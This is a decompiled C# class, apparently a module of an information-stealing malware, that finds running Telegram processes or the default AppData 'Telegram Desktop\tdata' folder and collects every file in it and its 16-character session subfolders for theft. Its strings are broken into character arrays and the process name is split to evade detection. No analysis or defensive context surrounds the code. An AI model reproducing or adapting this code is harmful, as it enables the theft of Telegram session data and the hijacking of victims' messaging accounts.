using System;
using System.Collections.Generic;
using System.IO;

// Token: 0x02000018 RID: 24
public class DesktopMessangerRule : FileScannerRule
{
	// Token: 0x17000001 RID: 1
	// (get) Token: 0x06000060 RID: 96 RVA: 0x00005664 File Offset: 0x00003864
	// (set) Token: 0x06000061 RID: 97 RVA: 0x0000566C File Offset: 0x0000386C
	public List<string> PassedPaths { get; set; } = new List<string>();

	// Token: 0x06000062 RID: 98 RVA: 0x00005678 File Offset: 0x00003878
	public override string GetFolder(FileScannerArg scannerArg, FileInfo fileInfo)
	{
		string result = new string(new char[]
		{
			'P',
			'r',
			'o',
			'f',
			'i',
			'l',
			'e',
			'_',
			'U',
			'n',
			'k',
			'n',
			'o',
			'w',
			'n'
		});
		try
		{
			DirectoryInfo directory = fileInfo.Directory;
			string text = string.Empty;
			if (directory.Name != new string(new char[]
			{
				't',
				'd',
				'a',
				't',
				'a'
			}))
			{
				text = directory.FullName.Split(new string[]
				{
					new string(new char[]
					{
						't',
						'd',
						'a',
						't',
						'a'
					})
				}, StringSplitOptions.RemoveEmptyEntries)[1];
			}
			return "Profile_" + scannerArg.Tag + (string.IsNullOrWhiteSpace(text) ? "" : ("\\" + text));
		}
		catch
		{
		}
		return result;
	}

	// Token: 0x06000063 RID: 99 RVA: 0x00005740 File Offset: 0x00003940
	public override IEnumerable<FileScannerArg> GetScanArgs()
	{
		List<FileScannerArg> list = new List<FileScannerArg>();
		try
		{
			int num = 1;
			foreach (string fileName in SystemInfoHelper.GetProcessesByName("Tel", "egram.exe"))
			{
				try
				{
					list.Add(new FileScannerArg
					{
						Tag = num.ToString(),
						Pattern = "*",
						Directory = new FileInfo(fileName).Directory.FullName + new string(new char[]
						{
							'\\',
							't',
							'd',
							'a',
							't',
							'a'
						}),
						Recoursive = false
					});
					foreach (string text in Directory.GetDirectories(new FileInfo(fileName).Directory.FullName + new string(new char[]
					{
						'\\',
						't',
						'd',
						'a',
						't',
						'a'
					})))
					{
						if (new DirectoryInfo(text).Name.Length == 16)
						{
							list.Add(new FileScannerArg
							{
								Tag = num.ToString(),
								Pattern = "*",
								Directory = text,
								Recoursive = false
							});
						}
					}
					num++;
				}
				catch (Exception)
				{
				}
			}
			if (list.Count == 0)
			{
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Telegram Desktop\\tdata";
				list.Add(new FileScannerArg
				{
					Tag = num.ToString(),
					Pattern = "*",
					Directory = text2,
					Recoursive = false
				});
				foreach (string text3 in Directory.GetDirectories(text2))
				{
					if (new DirectoryInfo(text3).Name.Length == 16)
					{
						list.Add(new FileScannerArg
						{
							Tag = num.ToString(),
							Pattern = "*",
							Directory = text3,
							Recoursive = false
						});
					}
				}
			}
		}
		catch
		{
		}
		return list;
	}
}
